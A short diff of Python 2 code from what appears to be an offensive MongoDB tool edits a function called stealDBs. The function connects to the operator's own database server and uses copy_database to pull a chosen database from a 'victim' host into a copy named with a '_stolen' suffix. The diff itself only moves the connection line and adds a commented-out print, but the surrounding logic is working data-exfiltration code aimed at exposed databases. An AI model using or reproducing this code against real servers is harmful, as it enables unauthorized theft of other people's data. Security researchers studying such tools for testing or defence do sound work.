@@ -163,9 +163,9 @@ def stealDBs(myDB,victim,mongoConn):
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
-
+		myDBConn = pymongo.MongoClient(myDB, 27017)
 		if dbNeedCreds in no_tag:
-			myDBConn = pymongo.MongoClient(myDB,27017)
+
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)
 
 		elif dbNeedCreds in yes_tag:
@@ -186,6 +186,7 @@ def stealDBs(myDB,victim,mongoConn):
 			return
 
 	except Exception, e:
+#		print str(e)
 		if str(e).find('text search not enabled') != -1:
 			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
 			return
